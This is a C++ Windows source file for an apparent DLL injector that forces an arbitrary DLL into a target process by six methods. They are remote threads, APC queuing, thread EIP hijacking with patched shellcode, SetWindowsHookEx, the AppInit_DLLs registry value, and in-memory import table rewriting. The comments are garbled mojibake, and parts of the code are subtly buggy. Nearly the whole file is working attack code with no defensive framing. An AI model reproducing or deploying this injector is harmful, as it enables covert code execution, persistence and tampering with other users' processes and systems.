#include"_tmain.h"
 



int _tmain(int argc,TCHAR* argv[],TCHAR* envp[])
{
	inject(argv[1], argv[2],argv[3]);  //Ŀ���������ע�뷽ʽ��hackdll�ļ�·��
	return 0;
}
void inject(TCHAR* ImageName, TCHAR* flag,TCHAR* DllPath)
{
	int Flag;
	_stscanf_s((const wchar_t*)flag, _T("%d"), &Flag);
	DWORD process_id = _PROCESS_HELPER_::get_processid_by_imagename((const TCHAR*)ImageName);
	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	switch (Flag)
	{
	case REMOTE_THREAD:
		create_remote_thread(process_handle,process_id, DllPath);
		break;
	case APC_INJECOT:
		apc_inject(process_handle, process_id, DllPath);    
		break;
	case HOOK_EIP:
		hook_eip_inject(process_handle, process_id, DllPath);
		break;
	case SETWINDOWHOOKEX:
		set_window_hookex_inject(process_handle, process_id, DllPath);
		break;
	case REGISTER_INJECT:
		register_inject(DllPath);     //��ò�Ҫ���Ը÷���
		break;
	case MODIFY_IMPORT_TABLE_INJECT:
	{
		modify_import_table_inject(process_handle, process_id, DllPath,_T("Sub_1"));
		break;
	}
	}
}

void apc_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath)
{
#ifdef UNICODE
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYW)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryW");
#else
	LPFN_LOADLIBRARYA LoadLibrary_Pointer = (LPFN_LOADLIBRARYA)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryA");
#endif

	LPVOID virtual_address = NULL;
	int last_error = 0;
	std::vector<DWORD> thread_identity{};
	HMODULE  kernel32_module_base = NULL;
	HANDLE thread_handle = INVALID_HANDLE_VALUE;
	virtual_address = VirtualAllocEx(ProcessHandle, NULL, (_tcslen(DllPath)+1)* sizeof(TCHAR), MEM_COMMIT, PAGE_READWRITE);
	if (virtual_address == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	if (WriteProcessMemory(ProcessHandle, virtual_address, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR), NULL) == FALSE){
		last_error = GetLastError();
		goto Exit;
	}
	if (_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity) == FALSE){            //���Ŀ������µ������߳�f
		last_error = GetLastError();
		goto Exit;
	}
	kernel32_module_base = GetModuleHandle(_T("KERNEL32.DLL"));
	if (kernel32_module_base == NULL)
	{
		goto Exit;
	}
	if (LoadLibrary_Pointer == NULL) {
		goto Exit;
	}
	for (int i = thread_identity.size() - 1; i >= 0; i--){          //���̱߳�����ִ���������������⣬���Բ��ôӺ���ǰ����ķ�ʽ����
		thread_handle = OpenThread(THREAD_SET_CONTEXT, FALSE, (DWORD)thread_identity[i]);
		if (thread_handle){
			QueueUserAPC((PAPCFUNC)LoadLibrary_Pointer, thread_handle,(ULONG_PTR)virtual_address);
			CloseHandle(thread_handle);
		}
	}
Exit:
	if (ProcessHandle != NULL){
		CloseHandle(ProcessHandle);
		ProcessHandle = INVALID_HANDLE_VALUE;
	}
	thread_identity.~vector();
}

void create_remote_thread(HANDLE ProcessHandle,DWORD ProcessIdentity, TCHAR* DllPath){
	void* _LoadLibrary_= _PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, (char*)"kernel32.dll", (char*)"LoadLibraryW");
	//2.��Ŀ�����������ռ�
	LPVOID base_address = VirtualAllocEx(ProcessHandle, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//3.д��DLL·��
	SIZE_T write_length = 0;
	BOOL ret = WriteProcessMemory(ProcessHandle, base_address, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR), &write_length);
	if (ret == FALSE){
		MessageBox(NULL, _T("WriteProcessMemory failed!"), _T("Error"), MB_OK);
		return;
	}
	HANDLE thread_handle=CreateRemoteThread(ProcessHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)_LoadLibrary_, (LPVOID)base_address, NULL, NULL);
	_gettchar();
}
void hook_eip_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath){
	CONTEXT	thread_context = { 0 };
	int     last_error = 0;
	PVOID   virtual_address = NULL;
	std::vector<DWORD> thread_identity{};
	HANDLE  thread_handle = NULL;
	PUINT8	dll_address_in_shell = NULL;
	_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity);   //�õ�Ŀ����̵������߳�ID
	if (_MEMORY_HELPER_::IsBadReadPtr(DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR))){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	virtual_address = VirtualAllocEx(ProcessHandle, NULL,sizeof(__ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  //Ŀ����̿ռ������ڴ�
	if (virtual_address == NULL){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	dll_address_in_shell = __ShellCode + 29;
	memcpy(dll_address_in_shell, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));  //��Dll����·������Ŀ����̿ռ���   
	*(PULONG)(__ShellCode + 3) = (ULONG_PTR)virtual_address + 29;     	//Push Address 
#ifdef UNICODE
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYW)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryW");
#else
	LPFN_LOADLIBRARYW LoadLibrary_Pointer = (LPFN_LOADLIBRARYA)_PE_HELPER_::get_remote_proc_address(ProcessIdentity, ProcessHandle, "kernel32.dll", "LoadLibraryA");
#endif
	*(PULONG)(__ShellCode + 25) = (ULONG)LoadLibrary_Pointer;   //��ǰexeģ���еĵ��뺯��
	*(PULONG_PTR)(__ShellCode + 9) = (ULONG_PTR)virtual_address + 25;
	thread_handle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_identity[0]);     //ͨ��Ŀ�����߳�ID������߳̾��
	if (thread_handle == NULL){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	SuspendThread(thread_handle);   //���ȹ����߳�
	thread_context.ContextFlags = CONTEXT_ALL;
	if (GetThreadContext(thread_handle, &thread_context) == FALSE){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	*(PULONG_PTR)(__ShellCode + 21) = thread_context.Eip;
	*(PULONG_PTR)(__ShellCode + 17) = (ULONG_PTR)virtual_address + 21;
	if (!WriteProcessMemory(ProcessHandle, virtual_address, __ShellCode, sizeof(__ShellCode), NULL)){
		release(virtual_address, thread_handle, ProcessHandle);
	}
	thread_context.Eip = (ULONG_PTR)virtual_address;    //�����ڵ�ShellCode��Ϊ�µ�ָ��
	if (!SetThreadContext(thread_handle, &thread_context)){                            	//���߳����±��������û��߳���
		release(virtual_address, thread_handle, ProcessHandle);
	}
	ResumeThread(thread_handle);       	//�ָ��̼߳���ִ��
	_gettchar();
}

void set_window_hookex_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath)
{
	int    last_error = 0;
	std::vector<DWORD>   thread_identity;
	HHOOK hook_handle = NULL;
	FARPROC Sub_1 = NULL;
	HMODULE module_base = NULL;
	if (_THREAD_HELPER_::get_thread_id(ProcessIdentity, thread_identity) == FALSE){
		last_error = GetLastError();
		goto Exit;
	}
	module_base = LoadLibrary((LPCWSTR)DllPath);
	if (module_base == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	Sub_1 = GetProcAddress(module_base, "Sub_1");
	if (Sub_1 == NULL){
		last_error = GetLastError();
		goto Exit;
	}
	for (int i = 0; i < thread_identity.size(); ++i){
		hook_handle = SetWindowsHookEx(WH_MOUSE, (HOOKPROC)Sub_1, module_base, (DWORD)thread_identity[i]);
		if (hook_handle != NULL){
			break;
		}
	}
	_gettchar();
Exit:
	if (hook_handle != NULL){
		UnhookWindowsHookEx(hook_handle);  //Remove Dll 
		hook_handle = NULL;
	}
	if (thread_identity.empty() == false){
		std::vector<DWORD>().swap(thread_identity);    //vector<>stl  
	}
	if (!!(thread_identity.size())){
		std::vector<DWORD>().swap(thread_identity);
	}
	if (module_base != NULL){
		FreeLibrary(module_base);
		module_base = NULL;
	}
}

BOOL register_inject(TCHAR* DllPath)
{
	HKEY key_handle = NULL;
	BYTE bufferdata[MAX_PATH] = { 0 };
	//����ֵ
	LONG isok = RegOpenKeyEx(HKEY_LOCAL_MACHINE, WINDOWS, 0, KEY_ALL_ACCESS, &key_handle);
	/*
		RegOpenKeyEx����һ��ָ����ע����
			HKEY hKey,			//��Ҫ�򿪵�����������       HKEY_LOCAL_MACHINE����ǰ�����
			LPCTSTR lpSubKey,	//��Ҫ�򿪵��Ӽ�������
			DWORD ulOptions,	//��������Ϊ0
			REGSAM samDesired,  //��ȫ���ʱ�ǣ�Ҳ����Ȩ��
			PHKEY phkResult     //���ڷ��أ��õ���Ҫ�򿪼��ľ��
		����ֵ���ɹ��򷵻�0(LONG��)
				ʧ�ܣ�IsOk=2������0���ַ������⣬���ܽ�char*ת��ΪLPCWSTR
				ʧ�ܣ�IsOk=5������0��Ȩ�޲�����Ҫ�Թ���Ա��ʽ����VS����
		ע�⣬Ҫ��RegCloseKey�ر�
	*/
	if (isok != ERROR_SUCCESS){
		_tprintf(_T("RegOpenKeyEx() Error!\n"));
		goto Exit;
	}
	memcpy(bufferdata, DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));
	isok = RegSetValueEx(key_handle, _T("AppInit_DLLs"), 0, REG_SZ, bufferdata, (_tcslen(DllPath) + 1) * sizeof(TCHAR));	//д���ֵ
	/*
		RegSetValueEx������ָ��ֵ�����ݺ�����
			HKEY hKey,				//�Ѵ���ľ��
			LPCTSTR lpValueName,	//������ֵ������
			DWORD Reserved,			//��������Ϊ0
			DWORD dwType,			//�����洢����������    REG_SZ��һ����0��β���ַ���
			CONST BYTE *lpData,		//һ������������������Ϊָ��ֵ���ƴ洢������
			DWORD cbData			//lpData������ָ������ݵĴ�С

	*/
	if (isok != ERROR_SUCCESS){
		_tprintf(_T("RegSetKeyValue() Error!\n"));
		goto Exit;
	}
Exit:
	if (key_handle)  RegCloseKey(key_handle);
	return isok;
}
ULONG  find_image_base_address_by_peb(HANDLE ProcessHandle)
{
	//��ȡĿ������е�PE�ṹ��Ϣ�����õ�exeӳ���ַImageBaseAddress������ʹ��ZwQueryInformationProcess�����Ǳ�������ȥƥ��MEM_IMAGE)
	HMODULE module_handle = GetModuleHandleA("ntdll.dll");
	LPFN_NtQueryInformationProcess NtQueryInformationProcess_Pointer = (LPFN_NtQueryInformationProcess)GetProcAddress(module_handle, "NtQueryInformationProcess");
	ULONG ReturnLength = 0;
	PROCESS_BASIC_INFORMATION* pbasic_info =new PROCESS_BASIC_INFORMATION();
	NtQueryInformationProcess_Pointer(ProcessHandle, ProcessBasicInformation, pbasic_info, sizeof(PROCESS_BASIC_INFORMATION), &ReturnLength);
	DWORD peb_base_address = (DWORD)pbasic_info->PebBaseAddress;
	PPEB pPeb = new PEB();
	BOOL ret = ReadProcessMemory(ProcessHandle,(LPCVOID)peb_base_address,pPeb,sizeof(PEB),0);
	if (!ret) return 0;
	ULONG_PTR image_base_address = (ULONG_PTR)pPeb->ImageBaseAddress;
	return image_base_address;
}

NTSTATUS modify_import_table_inject(HANDLE ProcessHandle, DWORD ProcessIdentity, TCHAR* DllPath, const TCHAR* DLLExportFunc)
{
	ULONG image_base_address = find_image_base_address_by_peb(ProcessHandle);
	PBYTE lpBuffer = new BYTE[BUFFER_SIZE];
	BOOL ret = ReadProcessMemory(ProcessHandle,(LPCVOID)image_base_address, lpBuffer,BUFFER_SIZE,0);
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS nt_headers;
	PIMAGE_FILE_HEADER file_header;
	PIMAGE_OPTIONAL_HEADER optional_header;
	PIMAGE_IMPORT_BY_NAME import_by_name;
	PIMAGE_IMPORT_DESCRIPTOR original_import_descriptor, new_import_descriptor;
	ULONG import_table_rva, import_table_size;
	ULONG new_import_table_va, new_import_table_size;
	PBYTE pbuf = NULL, pthunk_data = NULL;
	ULONG old_protect;
	NTSTATUS status;
	ULONG address_to_change_protect = NULL;
	ULONG size_to_change_protect = 0;
	ULONG total_image_size = 0;
	ULONG aligned_header_size = 0;
	if (image_base_address == 0)   return STATUS_INVALID_PARAMETER;
	dos_header = (PIMAGE_DOS_HEADER)lpBuffer;
	if (dos_header->e_magic != 0x5A4D)   return FALSE;          //MZ
	nt_headers = (PIMAGE_NT_HEADERS)((PBYTE)lpBuffer + dos_header->e_lfanew);
	if (nt_headers->Signature != 0x00004550) return FALSE;
	__try{
		file_header = (PIMAGE_FILE_HEADER)((PBYTE)lpBuffer + dos_header->e_lfanew + 4);
		optional_header = (PIMAGE_OPTIONAL_HEADER)((BYTE*)file_header + sizeof(IMAGE_FILE_HEADER));
		total_image_size = optional_header->SizeOfImage;  
		import_table_rva = optional_header->DataDirectory[1].VirtualAddress;  
		import_table_size = optional_header->DataDirectory[1].Size;
		original_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)lpBuffer + import_table_rva);
		new_import_table_size = import_table_size + sizeof(IMAGE_IMPORT_DESCRIPTOR);
		aligned_header_size = ALIGN_UP_BY(optional_header->SizeOfHeaders, optional_header->SectionAlignment);  //����PEͷ�����һ���ֿռ䣬Thunk������0x40��С�͹���
		pbuf = (PBYTE)((PBYTE)lpBuffer + aligned_header_size - new_import_table_size - 0x40);
		address_to_change_protect = image_base_address;  
		size_to_change_protect = aligned_header_size;
		HMODULE ntdll_module_base = LoadLibrary(_T("Ntdll.DLL"));
		if (ntdll_module_base == NULL) return FALSE;
		LPFN_NtProtectVirtualMemory NtProtectVirtualMemory_Pointer = NULL;
		NtProtectVirtualMemory_Pointer = (LPFN_NtProtectVirtualMemory)GetProcAddress(ntdll_module_base, "NtProtectVirtualMemory");
		if (NtProtectVirtualMemory_Pointer == NULL) return FALSE;
		status = NtProtectVirtualMemory_Pointer(ProcessHandle, (PVOID*)&address_to_change_protect, &size_to_change_protect, PAGE_EXECUTE_READWRITE, &old_protect);
		if (NT_SUCCESS(status)){

			memcpy(pbuf, original_import_descriptor, import_table_size);			//����ԭʼ�����
			new_import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pbuf + import_table_size - sizeof(IMAGE_IMPORT_DESCRIPTOR));  //�µ�ƫ��λ�ã��Ժ����,��ȥһ������������Ĵ�С����ΪIID������ȫ0�ṹ����
			pthunk_data = pbuf + new_import_table_size;		//����Thunk������
			memcpy((char*)(pthunk_data + 0x00), DllPath, (_tcslen(DllPath) + 1) * sizeof(TCHAR));   //��0x00����ʼ��DLL����
			import_by_name = (PIMAGE_IMPORT_BY_NAME)(pthunk_data + 0x20);			//��0x20������funcname
			import_by_name->Hint = 0;    //�����Ƶ��룬����ֱ����0����
			memcpy(import_by_name->Name, DLLExportFunc, (_tcslen(DLLExportFunc)+1)*sizeof(TCHAR));
			*(ULONG*)(pthunk_data + 0x30) = (ULONG)pthunk_data + 0x20 - image_base_address;			//��0x30������OriginalFirstThunk��ָ��0x20����IMAGE_IMPORT_BY_NAME
			*(ULONG*)(pthunk_data + 0x38) = (ULONG)pthunk_data + 0x20 - image_base_address;			//0x38��ΪFirstThunk
			new_import_descriptor->OriginalFirstThunk = (ULONG)pthunk_data + 0x30 - (ULONG)lpBuffer;			//����Լ���DLL������
			new_import_descriptor->TimeDateStamp = 0;
			new_import_descriptor->ForwarderChain = 0;
			new_import_descriptor->Name = (ULONG)pthunk_data - (ULONG)lpBuffer;
			new_import_descriptor->FirstThunk = (ULONG)pthunk_data + 0x38 - (ULONG)lpBuffer;
			new_import_table_va = (ULONG)pbuf - (ULONG)lpBuffer;			//�����µ������ƫ����
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = new_import_table_va;			//�޸�����
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = new_import_table_size;
			//��ֹ�������
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
			optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
			if (WriteProcessMemory(ProcessHandle, (LPVOID)image_base_address, lpBuffer, total_image_size, 0)) 
				return STATUS_SUCCESS;
		}
		else return status;
	}
	__except (EXCEPTION_EXECUTE_HANDLER){
		return GetExceptionCode();
	}
}


void release(PVOID lpAddress, HANDLE ThreadHandle, HANDLE ProcessHandle)
{
	if (lpAddress != NULL) {
		VirtualFreeEx(ProcessHandle, lpAddress, sizeof(__ShellCode), MEM_RELEASE);
	}
	if (ThreadHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(ThreadHandle);
	}
	if (ProcessHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(ProcessHandle);
	}
}